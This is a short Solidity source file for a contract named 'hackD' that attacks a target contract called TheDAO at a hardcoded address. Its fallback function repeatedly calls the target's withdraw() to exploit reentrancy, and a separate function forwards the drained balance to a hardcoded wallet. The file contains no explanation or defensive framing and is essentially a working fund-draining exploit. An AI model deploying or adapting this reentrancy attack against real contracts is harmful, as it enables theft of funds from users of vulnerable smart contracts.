pragma solidity ^0.4.20;

contract TheDAO{
  function withdraw() public;
}
contract hackD {
  //uint public value;
  uint public times = 3;
  address dao6 = 0x9dF811B42206FB6BE7d2AbAae43C332a1299C7C8;
  mapping (address => uint) balances;
 address myWallet = 0x4E828d2cE71cc1fc9233902945D9f452c61Cc465;

function hackD() payable public  {

}
  function() public payable {
   // balances[msg.sender] = msg.value;
    //  sendBalance();
   FuckDao();
 //  withdraw();
  }

  function balanceOf(address _addr) public view returns (uint) {
    return balances[_addr];
  }

   function withdrawAll() public payable{
  //  owner.send(this.balance);
    myWallet.send(this.balance);
  }

   function sendMoney() public payable  {
        // return (honeypot.call.value(49 ether)(), address(this).balance);
        dao6.call.value(this.balance)();
    }


  function FuckDao() {

    if(times > 0)
    {
      TheDAO dao = TheDAO(dao6);
      dao.withdraw();
      times--;
    }
  }


}
